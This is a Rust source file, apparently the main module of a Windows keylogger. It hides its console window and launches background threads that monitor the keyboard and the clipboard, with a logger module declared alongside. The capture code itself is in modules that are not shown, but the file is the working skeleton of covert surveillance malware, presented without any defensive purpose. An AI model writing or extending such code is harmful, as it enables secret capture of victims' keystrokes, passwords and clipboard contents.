#![windows_subsystem = "windows"]

mod clipboard;
mod keyboard;
mod logger;
mod key_mapping;

use std::thread;

pub fn main() {
    let mut threads=Vec::new();
    threads.push(thread::spawn(|| keyboard::monitor_keyboard()));
    threads.push(thread::spawn(|| clipboard::monitor_clipboard()));
    for i in threads {
        i.join().expect("failed to spawn thread");
    }
}
